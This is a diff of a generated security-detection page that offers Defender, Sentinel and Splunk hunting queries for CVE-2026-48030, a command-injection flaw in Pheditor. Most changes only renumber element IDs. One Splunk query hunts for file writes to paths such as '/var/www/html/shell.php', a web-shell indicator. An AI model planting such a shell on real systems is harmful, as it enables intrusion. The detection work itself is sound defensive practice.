 // gaps as a coarse approximation.
@@ -22825,12 +22887,12 @@ DeviceTvmSoftwareVulnerabilities
           VulnerabilitySeverityLevel, RecommendedSecurityUpdate
 | order by VulnerabilitySeverityLevel asc, DeviceName asc
 </code></pre></div>
-    <div class="tab-content" id="art-100-uc4-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    <div class="tab-content" id="art-100-uc5-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc5-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-48030&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
 | `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre><pre class="spl-mode-body" id="art-100-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-100-uc5-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-48030&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
@@ -22853,11 +22915,11 @@ DeviceTvmSoftwareVulnerabilities
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
     
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-100-uc5-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-100-uc5-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-100-uc5-spl">Splunk SPL (CIM)</button>
+      <button class="tab-btn active" data-target="art-100-uc6-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-100-uc6-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-100-uc6-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-100-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han
+    <div class="tab-content active" id="art-100-uc6-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han
 // Hunts the actual binaries / paths / commandline fragments named
 // in the article instead of a generic technique-class template.
 
@@ -22870,7 +22932,7 @@ DeviceFileEvents
           FileName, ActionType, InitiatingProcessFileName,
           InitiatingProcessCommandLine
 | order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-100-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
+    <div class="tab-content" id="art-100-uc6-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
 // Requires the Microsoft 365 Defender data connector (streams the
 // advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
 // Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han
@@ -22886,14 +22948,14 @@ DeviceFileEvents
           FileName, ActionType, InitiatingProcessFileName,
           InitiatingProcessCommandLine
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-100-uc5-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc5-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han ```
+    <div class="tab-content" id="art-100-uc6-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc6-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc6-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc6-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han ```
 | tstats `summariesonly` count
     from datamodel=Endpoint.Filesystem
     where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
       AND (Filesystem.file_path=&quot;*/dev/null*&quot; OR Filesystem.file_path=&quot;*/var/www/html*&quot; OR Filesystem.file_path=&quot;*/var/www/html/shell.php*&quot;)
     by Filesystem.dest, Filesystem.user, Filesystem.process_name,
        Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-100-uc5-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han ```
+| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-100-uc6-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han ```
 | tstats summariesonly=false count
     from datamodel=Endpoint.Filesystem
     where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
